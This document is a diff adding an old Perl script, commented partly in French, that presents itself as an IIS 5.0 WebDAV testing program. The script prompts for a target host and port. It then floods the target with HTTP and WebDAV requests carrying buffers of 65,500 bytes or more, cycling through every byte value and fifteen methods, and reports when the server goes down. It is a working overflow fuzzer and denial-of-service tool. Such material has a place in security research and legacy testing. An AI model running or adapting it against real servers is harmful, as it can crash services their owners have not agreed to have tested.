@@ -1,0 +1,63 @@
+#!/usr/bin/perl
+# Distribute this source Freely.
+# If u modify the source, let me know.
+# ************************************
+# NFO :
+# -----
+# IIS 5.0 WebDav Testing program ....
+# Methodologie de recherche de failles
+# sur un serveur IIS 5.0
+#
+#     mail:nicolaj@katatonie.com
+# ************************************
+# ------------- V1.0 -----------------
+# ************************************
+
+# Modules
+use IO::Socket::INET;
+
+#Variables
+@list = ("OPTIONS", "TRACE", "GET", "HEAD", "DELETE", "PUT", "POST", "COPY", "MOVE", "MKCOL", "PROPFIND", "PROPPATCH", "LOCK", "UNLOCK", "SEARCH");
+$ip = undef;
+$port = undef;
+
+#Quelques trucs divers pour la présentation ...
+print "\n---------------------------------------\n";
+print "--------IIS-5.0-WebDav-recherche-------\n";
+print "---------------------------------------\n";
+print "------------------V1-------------------\n";
+print "---------------------------------------\n";
+print "\n> IIS 5.0 WebDav Testing program \n<";
+
+while ($ip eq undef) {
+print "Entrez l'adresse IP ou le nom DNS : ";
+chomp ($ip = <STDIN>);}
+while ($port eq undef) {
+print "Entrez le port : ";
+chomp($port = <STDIN>);}
+
+# Main prog ...
+for ($a=1;$a<=255;$a++) {
+foreach $list(@list) {
+for ($i=1;$i<=2000;$i++) {
+my $buffer = chr($a) x (65500 + $i);
+
+print "\n";
+print "Sending data ... :\n",chr($a)," ",$i," ",$list;
+print "******************\n";
+print "\n";
+
+$sock = IO::Socket::INET->new(
+        Proto => "tcp",
+	PeerAddr => $ip,
+	PeerPort => $port
+	)
+or die "connexion impossible ... Serveur Web DOWN\nChr $a,\nTentative $i,\nCommande webdav: $list\n";
+$sock -> autoflush(1);
+# envoi de la requete HTTP OPTIONS et affichage sur la sortie standard.
+print $sock $list," /", $buffer, "\r\n\r\n";
+while ( <$sock> ) { print; }
+close $sock;
+}
+}
+}
